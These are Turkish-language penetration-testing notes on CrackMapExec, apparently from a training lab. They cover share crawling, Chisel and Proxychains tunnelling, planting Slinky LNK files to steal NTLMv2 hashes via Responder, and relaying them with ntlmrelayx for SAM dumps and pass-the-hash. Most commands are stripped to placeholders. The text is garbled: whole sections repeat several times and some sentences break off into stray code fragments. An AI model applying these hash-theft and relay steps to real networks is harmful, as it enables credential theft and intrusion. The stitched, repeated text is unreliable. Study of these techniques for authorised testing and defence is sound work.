Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}, 'print

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---

### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---

### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

{{CODE_BLOCK_109}}

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_110}}

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

{{CODE_BLOCK_112}}

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

{{CODE_BLOCK_113}}


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

{{CODE_BLOCK_114}}


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

{{CODE_BLOCK_115}}


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

{{CODE_BLOCK_116}}

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

{{CODE_BLOCK_117}}


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

{{CODE_BLOCK_118}}

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

{{CODE_BLOCK_119}}

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

{{CODE_BLOCK_120}}

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

{{CODE_BLOCK_121}}, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus

```

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---

### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

